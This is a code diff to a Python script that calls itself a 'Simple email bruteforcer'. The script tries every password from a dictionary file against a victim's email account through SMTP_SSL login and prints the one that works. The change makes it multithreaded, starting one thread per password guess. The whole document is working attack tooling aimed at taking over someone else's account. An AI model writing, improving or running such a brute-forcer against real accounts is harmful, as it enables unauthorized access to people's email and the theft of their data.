@@ -9,7 +9,7 @@ import sys
 import time
 import os
 import argparse
-
+import threading
 
 
 parser = argparse.ArgumentParser(description='Simple email bruteforcer')
@@ -22,9 +22,12 @@ args = vars(parser.parse_args())
 victim_mail = args['victim_email']
 smtp_server = args['victim_smtp']
 port = args['smtp_port']
-dict_brut = open(args['dictionnary'],'r')
-for list_pass in dict_brut:
-    passwd = list_pass.rstrip()
+dict_brut = args['dictionnary']
+
+
+#Process for MultiThread
+def try_password(password, smtp_server, port, victim_mail):
+    passwd = password.rstrip()
     print("[*] try password: {} ".format(passwd))
     try:
         smtp = smtplib.SMTP_SSL(smtp_server, int(port))
@@ -32,9 +35,14 @@ for list_pass in dict_brut:
         answer, status  = smtp.login(victim_mail, passwd)
         if status == b'Authentication succeeded':
             print("\n[+] Cool Password Found: {}".format(passwd))
-            break
+            sys.exit(0)
         else:
             raise ConnectionResetError
     except:
         time.sleep(1)
         pass
+
+with open(dict_brut,'r') as dictbrut:
+    for list_pass in dictbrut:
+        t = threading.Thread(target=try_password, args=(list_pass, smtp_server, port, victim_mail))
+        t.start()
